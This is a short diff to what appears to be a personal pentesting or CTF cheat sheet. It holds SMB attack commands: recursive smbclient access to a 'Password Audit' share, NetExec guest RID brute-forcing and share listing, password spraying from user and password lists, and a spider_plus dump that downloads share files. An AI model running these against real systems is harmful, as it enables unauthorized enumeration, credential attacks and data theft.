@@ -28,7 +28,7 @@ smbclient //192.168.195.175/Password\ Audit -U 'V.Ventz' -c 'prompt OFF;recurse 
 ```bash
 nxc smb 10.10.11.35 -u 'guest' -p '' --rid-brute
 nxc smb 10.10.11.35 -u 'guest' -p '' --shares
-nxc smb {IP} -u user.txt -p password.txt //we can add --continue-on-success
+nxc smb {IP} -u user.txt -p password.txt #we can add --continue-on-success
 
 #Dump Data
 nxc smb ${NASIP} -u 'guest' -p '' -M spider_plus -o DOWNLOAD_FLAG=True 
